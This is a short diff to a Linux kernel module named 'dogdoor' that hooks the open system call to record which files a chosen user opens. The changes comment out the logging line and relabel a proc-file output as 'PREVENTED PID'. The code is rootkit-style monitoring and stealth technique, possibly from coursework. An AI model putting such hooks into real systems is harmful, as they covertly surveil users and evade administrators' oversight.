@@ -64,7 +64,7 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 
     if (my_cred->uid.val == i_user_uid && i_user_uid != -1) {
         init_filenames(filename);
-        printk("ACCESSED : %s\n", filename);
+        /*printk("ACCESSED : %s\n", filename);*/
     }
 
 	return orig_sys_open(filename, flags, mode) ;
@@ -124,7 +124,7 @@ ssize_t dogdoor_pid_proc_read(struct file *file, char __user *ubuf, size_t size,
 	ssize_t toread ;
     char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);
 
-    strcpy(cattest, "CURRENT PID:");
+    strcpy(cattest, "PREVENTED PID:");
     strcat(cattest, prevented_pid);
     strcat(cattest, "\n");
     toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
